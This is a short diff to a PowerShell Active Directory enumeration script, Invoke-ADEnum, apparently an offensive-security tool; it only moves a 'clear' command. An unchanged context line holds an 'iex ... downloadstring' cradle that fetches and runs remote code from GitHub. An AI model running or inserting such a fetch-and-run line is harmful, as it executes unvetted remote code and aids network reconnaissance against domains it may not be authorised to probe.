@@ -4,8 +4,6 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 
 Set-Variable MaximumHistoryCount 32767
 
-clear
-
 function Invoke-ADEnum
 {
 <#
@@ -124,6 +122,8 @@ Invoke-ADEnum -Output C:\Windows\Temp\Invoke-ADEnum.txt
     if($Output){$OutputFilePath = $Output}
     else{$OutputFilePath = "$pwd\Invoke-ADEnum.txt"}
 
+    clear
+    
     # Start capturing the script's output and save it to the file
     Start-Transcript -Path $OutputFilePath
     
